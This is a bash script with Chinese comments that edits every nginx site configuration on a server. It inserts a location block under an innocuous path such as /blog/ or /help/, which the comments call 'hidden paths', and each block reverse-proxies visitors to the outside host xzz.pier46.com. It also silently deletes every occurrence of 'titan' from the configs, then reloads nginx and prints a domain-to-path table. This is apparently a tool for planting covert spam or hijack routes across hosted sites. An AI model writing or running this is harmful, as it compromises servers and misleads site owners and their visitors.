#!/bin/bash
 
NGINX_DIR="/etc/nginx/sites-enabled"
 
# 随机路径候选列表
PATHS=("help" "news" "page" "blog" "bangzhuzhongxin" "zh" "pc")
TOTAL=${#PATHS[@]}
 
# 用来保存 域名 ↔ 随机路径 的映射（内存中）
declare -A DOMAIN_TO_PATH
 
read -r -d '' BLOCK_TEMPLATE << 'EOF'
    location /RANDOM_PATH/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/RANDOM_PATH/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }
EOF
 
echo "开始处理 $NGINX_DIR 下的所有配置文件..."
echo "每个站点将随机分配一个隐蔽路径，并在最后显示完整映射表"
echo ""
 
find "$NGINX_DIR" \( -type f -o -type l \) -print0 | while IFS= read -r -d '' file; do
    [[ -f "$file" || -L "$file" ]] || continue
    filename=$(basename "$file")
    echo "正在处理: $filename"
 
    # 为当前站点随机一个路径
    RAND_IDX=$((RANDOM % TOTAL))
    RANDOM_PATH="${PATHS[$RAND_IDX]}"
 
    # 替换模板
    BLOCK="${BLOCK_TEMPLATE//RANDOM_PATH/$RANDOM_PATH}"
 
    tmp=$(mktemp)
 
    # 插入 location 块
    awk -v block="$BLOCK" '
    {
        print $0
        if ($0 ~ /^\s*server_name[^;]*;/ || $0 ~ /^\s*server_name[^;]*$/ && !/;/) {
            if ($0 ~ /;\s*$/) {
                print block
                print ""
            } else {
                pending = 1
            }
        }
        else if (pending && $0 ~ /;\s*$/) {
            print block
            print ""
            pending = 0
        }
    }
    ' "$file" > "$tmp"
 
    sed -i 's/[Tt][Ii][Tt][Aa][Nn]//g' "$tmp"
 
    if ! cmp -s "$tmp" "$file"; then
        mv "$tmp" "$file"
        echo "  ✓ 已插入 → /$RANDOM_PATH/"
    else
        rm -f "$tmp"
        echo "  - 已存在，无需重复插入"
    fi
 
    # ============ 关键：提取当前配置中的所有 server_name 并记录映射 ============
    # 提取所有 server_name 行（支持单行和多行写法）
    server_names=$(awk '
        /^\s*server_name/ {
            gsub(/;/, "");
            sub(/^\s*server_name\s+/, "");
            print $0
        }
    ' "$file" | tr '\n' ' ' | sed 's/\s\+/ /g' | sed 's/ $//')
 
    # 如果没提取到（极少数异常配置），跳过
    [[ -z "$server_names" ]] && server_names="未知域名"
 
    # 保存到关联数组（内存中）
    DOMAIN_TO_PATH["$filename → $server_names"]="/$RANDOM_PATH/"
 
done
 
# 清理空行
find "$NGINX_DIR" \( -type f -o -type l \) -exec sed -i '/^\s*$/d' {} + 2>/dev/null
 
# 重载 Nginx
echo ""
echo "正在校验并重载 Nginx..."
if nginx -t > /dev/null 2>&1; then
    systemctl reload nginx 2>/dev/null || nginx -s reload
    echo "Nginx 已平滑重载成功！"
else
    echo "Nginx 配置错误！"
    nginx -t
    exit 1
fi
 
# ============== 美观输出：域名 ↔ 随机路径 映射表 ==============
echo ""
echo "════════════════════════════════════════════════════════════"
echo "          当前所有站点随机路径分配结果（内存统计）"
echo "════════════════════════════════════════════════════════════"
printf "%-50s → %s\n" "域名（server_name）" "随机访问路径"
echo "────────────────────────────────────────────────────────────"
for key in "${!DOMAIN_TO_PATH[@]}"; do
    printf "%-50s → \033[1;33m%s\033[0m\n" "${key#* → }" "${DOMAIN_TO_PATH[$key]}"
done | sort
echo "────────────────────────────────────────────────────────────"
echo "总计站点数: ${#DOMAIN_TO_PATH[@]} 个"
echo "路径池: help | news | page | blog | bangzhuzhongxin | zh | pc"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "提示：访问方式示例："
echo "   https://yourdomain.com/blog/     （根据上面表格实际路径）"
echo ""
echo "脚本执行完成！所有映射已显示在上面表格中，永久保存请截图或重定向输出。"
